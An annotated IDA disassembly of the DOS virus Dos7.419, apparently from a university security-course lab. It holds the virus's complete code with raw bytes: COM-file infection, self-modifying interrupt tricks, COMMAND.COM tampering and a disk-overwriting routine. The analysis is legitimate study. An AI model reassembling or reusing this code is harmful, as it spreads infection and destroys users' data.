seg000:0100                            ;
seg000:0100                            ; +-------------------------------------------------------------------------+
seg000:0100                            ; |      This file was generated by The Interactive Disassembler (IDA)      |
seg000:0100                            ; |           Copyright (c) 2019 Hex-Rays, <support@hex-rays.com>           |
seg000:0100                            ; |                      License info: 48-BABB-7E64-E2                      |
seg000:0100                            ; |                     Georgia Institute of Technology                     |
seg000:0100                            ; +-------------------------------------------------------------------------+
seg000:0100                            ;
seg000:0100                            ; Input SHA256 : 7E00694397CBB7B422CB2F3E39A34C7FB7554931A1A9A2CF9AE7B2BCF42296E3
seg000:0100                            ; Input MD5    : 0B4A318803AA1B9B6A0DCC55CEFCB7CE
seg000:0100                            ; Input CRC32  : 785762D7
seg000:0100
seg000:0100                            ; ---------------------------------------------------------------------------
seg000:0100                            ; File Name   : /nethome/pthirumal3/ECE4117/lab3/Virus.DOS.Dos7.419
seg000:0100                            ; Format      : Binary file
seg000:0100                            ; Base Address: 0000h Range: 0100h - 02C8h Loaded length: 01C8h
seg000:0100
seg000:0100                                            .686p
seg000:0100                                            .mmx
seg000:0100                                            .model flat
seg000:0100
seg000:0100                            ; ===========================================================================
seg000:0100
seg000:0100                            ; Segment type: Pure code
seg000:0100                            seg000          segment byte public 'CODE' use16
seg000:0100                                            assume cs:seg000
seg000:0100                                            ;org 100h
seg000:0100                                            assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg000:0100 C7 06 07 01 52 01                          mov     word ptr ds:interrupt_modifier+1, 152h ; self modifying code
seg000:0106
seg000:0106                            interrupt_modifier:                     ; DATA XREF: seg000:0100↑w
seg000:0106 B8 52 01                                   mov     ax, 152h        ; Points to where wipe HD instruction is
seg000:0109 A3 2E 01                                   mov     word ptr ds:prepend+5, ax ; self modifying code
seg000:010C 2B C0                                      sub     ax, ax          ; ax = 0
seg000:010E 1E                                         push    ds              ; save ds value
seg000:010F 8E D8                                      mov     ds, ax          ; reset ds
seg000:0111 8E C0                                      mov     es, ax          ; reset es
seg000:0113 BE 84 00                                   mov     si, 84h         ; Interrupt 21 location
seg000:0116 BF 0C 00                                   mov     di, 0Ch         ; Interrupt 3 location
seg000:0119 A5                                         movsw                   ; Replace interrupt 3 with interrupt 21
seg000:011A A5                                         movsw                   ; replace interrupt 3 with interrupt 21
seg000:011B 26 A1 00 00                                mov     ax, es:0        ; ax now has INT 0
seg000:011F A3 70 01                                   mov     word ptr ds:restore_0+5, ax ; Restore INT 0 address offset
seg000:0122 26 A1 02 00                                mov     ax, es:2        ; ax now has INT 0 segment
seg000:0126 A3 77 01                                   mov     word ptr ds:restore_0_cont+5, ax ; Restore INT 0 segment
seg000:0129
seg000:0129                            prepend:                                ; DATA XREF: seg000:0109↑w
seg000:0129 26 C7 06 00 00 52 01                       mov     word ptr es:0, 152h ; Points to where wipe HD instruction is
seg000:0130 1F                                         pop     ds              ; Pop the ds register from the stack
seg000:0131 8C D8                                      mov     ax, ds          ; Get the starting address of the segment register
seg000:0133 80 C4 10                                   add     ah, 10h         ; New segment is FFFF bytes
seg000:0136 26 A3 02 00                                mov     es:2, ax        ; Above this one (Max length for COMs)
seg000:013A 8E C0                                      mov     es, ax
seg000:013C                                            assume es:nothing
seg000:013C BF 00 01                                   mov     di, 100h        ; Destination of virus copy
seg000:013F 8B F7                                      mov     si, di          ; Prepend the virus to the start
seg000:0141 B9 A3 01                                   mov     cx, 1A3h        ; Copy 419 bytes of virus code
seg000:0144 F3 A4                                      rep movsb               ; Move virus to new segment
seg000:0146 8E D8                                      mov     ds, ax          ; Set the ds register value
seg000:0148                                            assume ds:nothing
seg000:0148 F7 F1                                      div     cx              ; Divide by 0 error
seg000:014A
seg000:014A                            close_file:                             ; CODE XREF: seg000:01AB↓j
seg000:014A B4 3E                                      mov     ah, 3Eh ; '>'   ; Close file
seg000:014C CC                                         int     3               ; Trap to Debugger (actually int 21)
seg000:014D
seg000:014D                            find_next:                              ; CODE XREF: seg000:0195↓j
seg000:014D                                                                    ; seg000:01A5↓j
seg000:014D B4 4F                                      mov     ah, 4Fh ; 'O'   ; Find next matching filename
seg000:014F CC                                         int     3               ; Trap to Debugger (actually int 21)
seg000:0150 EB 3A                                      jmp     short ID_Check  ; Check file ID
seg000:0152                            ; ---------------------------------------------------------------------------
seg000:0152 2B C9                                      sub     cx, cx          ; Wipe out HD
seg000:0154
seg000:0154                            next_sector:                            ; CODE XREF: seg000:0166↓j
seg000:0154 41                                         inc     cx              ; Increment sector number by 1
seg000:0155 0E                                         push    cs              ; Save cs
seg000:0156 07                                         pop     es              ; es = cs
seg000:0156                            ; ---------------------------------------------------------------------------
seg000:0157                                            assume es:nothing
seg000:0157 B8                         Write_on_Hard_Drive db 0B8h
seg000:0158                            ; ---------------------------------------------------------------------------
seg000:0158 05 FE EB                                   add     ax, 0EBFEh      ; ax = 0FE05 + 0EBFE
seg000:015B FC                                         cld                     ; Same as inputting a nop here
seg000:015C 2D 02 E7                                   sub     ax, 0E702h      ; ax = 301h (Write to sector)
seg000:015F B7 01                                      mov     bh, 1           ; Head 1
seg000:0161 BA 00 00                                   mov     dx, 0           ; Drive A:
seg000:0164 CD 13                                      int     13h             ; DISK - DISK - SET TYPE (AT,XT2,XT286,CONV,PS
seg000:0164                                                                    ; AL = disk type AL = 03h - high-capacity disk in high-capacity drive
seg000:0166 EB EC                                      jmp     short next_sector ; Write to all available sectors on HD
seg000:0168                            ; ---------------------------------------------------------------------------
seg000:0168 06                                         push    es              ; All sectors written so saves es
seg000:0169 51                                         push    cx              ; Save cx
seg000:016A 07                                         pop     es              ; es = last value of cx
seg000:016B
seg000:016B                            restore_0:                              ; DATA XREF: seg000:011F↑w
seg000:016B 26 C7 06 00 00 4C 4D                       mov     word ptr es:0, 4D4Ch ; Restore INT 0 handler address offset
seg000:0172
seg000:0172                            restore_0_cont:                         ; DATA XREF: seg000:0126↑w
seg000:0172 26 C7 06 02 00 41 53                       mov     word ptr es:2, 5341h ; Restore INT 0 handler segment
seg000:0179 07                                         pop     es              ; Remove es from stack
seg000:017A C7 06 07 01 68 01                          mov     word ptr ds:107h, 168h
seg000:0180 B4 1A                                      mov     ah, 1Ah         ; Set DTA
seg000:0182 99                                         cwd                     ; Convert to double word
seg000:0183 CC                                         int     3               ; Trap to Debugger (actually int 21)
seg000:0184 B4 4E                                      mov     ah, 4Eh ; 'N'   ; Find first matching file
seg000:0186 2B C9                                      sub     cx, cx          ; Dont care about attributes
seg000:0188 BA 23 02                                   mov     dx, 223h        ; Address of description
seg000:018B CC                                         int     3               ; Trap to Debugger (actually int 21)
seg000:018C
seg000:018C                            ID_Check:                               ; CODE XREF: seg000:0150↑j
seg000:018C 72 7E                                      jb      short Restore_Host ; No file found
seg000:018E B8 02 3D                                   mov     ax, 3D02h       ; Open file for read write accesss
seg000:0191 BA 1E 00                                   mov     dx, 1Eh         ; filename to open at offset 1E in DTA
seg000:0194 CC                                         int     3               ; Trap to Debugger (actually int 21)
seg000:0195 72 B6                                      jb      short find_next ; Failed so find next file
seg000:0197 8B D8                                      mov     bx, ax          ; bx <-- file handle (returned in ax)
seg000:0199 B4 3F                                      mov     ah, 3Fh ; '?'   ; 3Fh = int 21 read file
seg000:019B BF 1A 00                                   mov     di, 1Ah         ; addr of # of bytes in matching file at offset 1Ah in DTA
seg000:019E 8B 0D                                      mov     cx, [di]        ; cx <-- # of bytes to read in discovered file
seg000:01A0 8B D6                                      mov     dx, si          ; Buffer for read
seg000:01A2 CC                                         int     3               ; Trap to Debugger (actually int 21)
seg000:01A3 8B 04                                      mov     ax, [si]        ; Start from beginning of file
seg000:01A5 72 A6                                      jb      short find_next
seg000:01A7 3B 06 00 01                                cmp     ax, ds:100h     ; Check for infection
seg000:01AB 74 9D                                      jz      short close_file ; Infected so close file
seg000:01AD 8B 44 02                                   mov     ax, [si+2]      ; If not infected, Look at 3rd and 4th bytes
seg000:01B0 3D 15 60                                   cmp     ax, 6015h       ; DOS 6's COMMAND.COM?
seg000:01B3 74 02                                      jz      short COMMAND_COM ; Yes it is a COM file
seg000:01B5 EB 3F                                      jmp     short regular_infect ; No. So regular infect this file
seg000:01B7                            ; ---------------------------------------------------------------------------
seg000:01B7
seg000:01B7                            COMMAND_COM:                            ; CODE XREF: seg000:01B3↑j
seg000:01B7 57                                         push    di              ; Save di
seg000:01B8 56                                         push    si              ; Save si
seg000:01B9 BE 4D 02                                   mov     si, 24Dh        ; Copy virus message: MSDOS 7 (C)1993 ANARKICK SYSTEMS
seg000:01BC BF F0 23                                   mov     di, 23F0h       ; To Command.COM sopyright notice
seg000:01BF B9 55 00                                   mov     cx, 55h ; 'U'   ; Length of message to be copied
seg000:01C2 90                                         nop
seg000:01C3 FC                                         cld                     ; String operation increment si, di
seg000:01C4 F3 A4                                      rep movsb               ; Copy message
seg000:01C6 BE 2A 02                                   mov     si, 22Ah        ; Virus message: is infected
seg000:01C9 BF 57 90                                   mov     di, 9057h       ; Copy to COMMAND.COM
seg000:01CC B9 0C 00                                   mov     cx, 0Ch         ; Length of message to be copied
seg000:01CF 90                                         nop
seg000:01D0 F3 A4                                      rep movsb               ; Copy the message
seg000:01D2 BE 36 02                                   mov     si, 236h        ; Virus message: oy, are you ever dumb
seg000:01D5 BF 4C 91                                   mov     di, 914Ch       ; Copy to COMMAND.COM
seg000:01D8 B9 17 00                                   mov     cx, 17h         ; Length of message
seg000:01DB 90                                         nop
seg000:01DC F3 A4                                      rep movsb               ; Copy the message
seg000:01DE B8 00 42                                   mov     ax, 4200h       ; Move file pointer to beginning of file
seg000:01E1 2B D2                                      sub     dx, dx          ; dx = 0
seg000:01E3 8B CA                                      mov     cx, dx          ; cx = 0
seg000:01E5 CC                                         int     3               ; Trap to Debugger (actually int 21)
seg000:01E6 B4 40                                      mov     ah, 40h ; '@'   ; Write updated COMMAND.COM file
seg000:01E8 BA A3 02                                   mov     dx, 2A3h        ; Back to disk
seg000:01EB B9 BD CE                                   mov     cx, 0CEBDh      ; Length of file
seg000:01EE CC                                         int     3               ; Trap to Debugger (actually int 21)
seg000:01EF B4 3E                                      mov     ah, 3Eh ; '>'   ; Close COMMAND.COM file
seg000:01F1 CC                                         int     3               ; Trap to Debugger (actually int 21)
seg000:01F2 5E                                         pop     si              ; Restore si
seg000:01F3 5F                                         pop     di              ; Restore di
seg000:01F4 EB 16                                      jmp     short Restore_Host ; After writing to command.com restore host
seg000:01F6                            ; ---------------------------------------------------------------------------
seg000:01F6
seg000:01F6                            regular_infect:                         ; CODE XREF: seg000:01B5↑j
seg000:01F6 B8 00 42                                   mov     ax, 4200h       ; Move file pointer to beginning of file
seg000:01F9 2B D2                                      sub     dx, dx          ; dx = 0
seg000:01FB 8B CA                                      mov     cx, dx          ; cx = 0
seg000:01FD CC                                         int     3               ; Trap to Debugger (actually int 21)
seg000:01FE FE C6                                      inc     dh              ; dx = 100h
seg000:0200 B4 40                                      mov     ah, 40h ; '@'   ; Write virus to file
seg000:0202 8B 0D                                      mov     cx, [di]        ; Length of file to be written
seg000:0204 81 C1 A3 01                                add     cx, 1A3h        ; Length of file to be written
seg000:0208 CC                                         int     3               ; Trap to Debugger (actually int 21)
seg000:0209 B4 3E                                      mov     ah, 3Eh ; '>'   ; Close file
seg000:020B CC                                         int     3               ; Trap to Debugger (actually int 21)
seg000:020C
seg000:020C                            Restore_Host:                           ; CODE XREF: seg000:ID_Check↑j
seg000:020C                                                                    ; seg000:01F4↑j
seg000:020C 8C D0                                      mov     ax, ss          ; ax = ss
seg000:020E 8E C0                                      mov     es, ax          ; Restore es
seg000:0210 8E D8                                      mov     ds, ax          ; Restore ds
seg000:0212                                            assume ds:nothing
seg000:0212 50                                         push    ax              ; Prepare to retf to host
seg000:0213 B4 1A                                      mov     ah, 1Ah         ; Pointer to DTA
seg000:0215 D1 EA                                      shr     dx, 1           ; Restore DTA
seg000:0217 CC                                         int     3               ; Trap to Debugger (actually int 21)
seg000:0218 BF 00 01                                   mov     di, 100h        ; COM offset
seg000:021B 57                                         push    di              ; COM entry is now in correct spot in stack
seg000:021C 8B CC                                      mov     cx, sp          ; cx = sp
seg000:021E 2B CE                                      sub     cx, si          ; Move host to proper offset
seg000:0220 F3 A4                                      rep movsb               ; Move Host
seg000:0222 CB                                         retf                    ; Execute Host
seg000:0222                            ; ---------------------------------------------------------------------------
seg000:0223 2A 57 2E 43 3F 4D 00       aWCM            db '*W.C?M',0
seg000:022A 69 73 20 69 6E 66 65 63 74+aIsInfected     db 'is infected!'
seg000:0236 6F 79 2C 20 61 72 65 20 79+aOyAreYouEverDu db 'oy, are you ever dumb! '
seg000:024D 4D 53 44 4F 53 20 37 20 28+aMsdos7C1993Ana db 'MSDOS 7 (C)1993 ANARKICK SYSTEMS',0Dh
seg000:026E 0A 01 01 01                                db 0Ah
seg000:026E                                            db 1,1,1
seg000:0272 20 20 20 20 20 44 4F 53 20+aDos6AntivirusS db '     DOS 6 Antivirus sucks. It missed this one! $'
seg000:02A3                            ; ---------------------------------------------------------------------------
seg000:02A3 B4 09                                      mov     ah, 9           ; Print String
seg000:02A5 BA 09 01                                   mov     dx, 109h        ; DS:DX = pointer to string ending in "$"
seg000:02A8 CC                                         int     3               ; Trap to Debugger (actually int 21)
seg000:02A9 B4 4C                                      mov     ah, 4Ch ; 'L'   ; Terminate program
seg000:02AB CC                                         int     3               ; Trap to Debugger (actually int 21)
seg000:02AB                            ; ---------------------------------------------------------------------------
seg000:02AC 5B 44 4F 53 20 37 76 01 01+aDos7vLuciferMe db '[DOS 7v',1,1,1,'] Lucifer Messiah$'
seg000:02AC 01 5D 20 4C 75 63 69 66 65+seg000          ends
seg000:02AC 72 20 4D 65 73 73 69 61 68+
seg000:02AC 24
seg000:02AC                                            end
